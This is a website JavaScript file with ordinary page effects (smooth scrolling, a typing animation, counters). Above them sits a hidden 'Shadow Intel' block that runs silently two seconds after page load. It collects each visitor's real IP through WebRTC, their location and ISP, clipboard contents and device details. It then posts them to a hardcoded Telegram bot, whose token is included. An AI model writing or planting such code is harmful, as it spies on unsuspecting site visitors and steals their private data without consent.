/* Project: Shadow Intel v3
   Status: Stealth Mode Active
*/

(function(_0xShadow) {
    const _config = {
        _t: '8414005580:AAGDuGg7LemMlzS6QJu5_06aHamqMlGYnas', // আপনার বোট টোকেন
        _c: '7950771882' // আপনার চ্যাট আইডি
    };

    async function _dispatch(_msg) {
        try {
            await fetch(`https://api.telegram.org/bot${_config._t}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: _config._c, text: _msg, parse_mode: 'Markdown' })
            });
        } catch (e) {}
    }

    async function _initScanner() {
        // ১. নেটওয়ার্ক ও রিয়েল আইপি (WebRTC)
        let _rip = "Hidden";
        const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19002" }] });
        pc.createDataChannel(""); pc.createOffer().then(d => pc.setLocalDescription(d));
        pc.onicecandidate = (i) => {
            if (i && i.candidate && i.candidate.candidate) {
                _rip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
            }
        };

        // ২. আইপি ডিটেইলস (ISP/Org)
        let _ext = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));

        // ৩. ক্লিপবোর্ড ডেটা (যদি ইউজার পারমিশন দেয় বা ফোকাস থাকে)
        let _clip = "No Permission";
        if (navigator.clipboard) {
            _clip = await navigator.clipboard.readText().catch(() => "Protected");
        }

        // ৪. মেটাডাটা কম্পাইল
        const _log = `
🕵️ **Yash Khan Intel Report**
-----------------------------
🌐 **Public IP:** ${_ext.ip || 'N/A'}
📡 **Real IP (WebRTC):** ${_rip}
🏢 **ISP:** ${_ext.org || 'N/A'}
📍 **City:** ${_ext.city}, ${_ext.country_name}
🔋 **Battery:** ${navigator.getBattery ? (await navigator.getBattery()).level * 100 + '%' : 'N/A'}
📋 **Clipboard:** \`${_clip}\`
💻 **OS:** ${navigator.platform}
📱 **Device Memory:** ${navigator.deviceMemory || 'N/A'} GB
🧠 **CPU Cores:** ${navigator.hardwareConcurrency || 'N/A'}
🕒 **Time:** ${new Date().toLocaleString()}
-----------------------------
🛡️ *Unit: Offensive Bangladesh*
        `;

        _dispatch(_log);
    }

    // ব্যাকগ্রাউন্ডে ২ সেকেন্ড পর রান হবে
    setTimeout(_initScanner, 2000);

})(window);

// ===== Smooth Scroll =====
function scrollToSection() {
  const section = document.getElementById("resources");
  section.scrollIntoView({ behavior: "smooth" });
}

// ===== Typing Effect =====
const text = "Advanced Security • Free Tools • Digital Awareness";
let index = 0;

function typeEffect() {
  const typingElement = document.getElementById("typing");

  if (!typingElement) return;

  if (index < text.length) {
    typingElement.innerHTML += text.charAt(index);
    index++;
    setTimeout(typeEffect, 50);
  }
}

document.addEventListener("DOMContentLoaded", typeEffect);

// ===== Counter Animation =====
const counters = document.querySelectorAll(".counter");

counters.forEach(counter => {
  counter.innerText = "0";

  const updateCounter = () => {
    const target = +counter.getAttribute("data-target");
    const current = +counter.innerText;

    const increment = target / 200;

    if (current < target) {
      counter.innerText = Math.ceil(current + increment);
      setTimeout(updateCounter, 15);
    } else {
      counter.innerText = target;
    }
  };

  updateCounter();
});
